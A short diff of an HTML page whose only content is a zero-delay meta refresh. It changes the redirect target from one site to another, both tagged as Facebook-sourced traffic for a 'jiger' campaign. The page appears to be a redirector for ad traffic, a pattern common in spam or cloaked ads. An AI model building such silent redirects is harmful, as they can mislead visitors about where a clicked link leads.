@@ -7,6 +7,6 @@
         
 
 
-    <meta http-equiv="Refresh" content="0; url=https://newfinemart.com/?p=4064&utm_source=fb&utm_medium=jiger&utm_campaign=jiger" />
+    <meta http-equiv="Refresh" content="0; url=https://khwabkitabeer.com/finance?utm_source=fb&utm_medium=jiger&utm_id=jiger" />
   </head>
 </html>
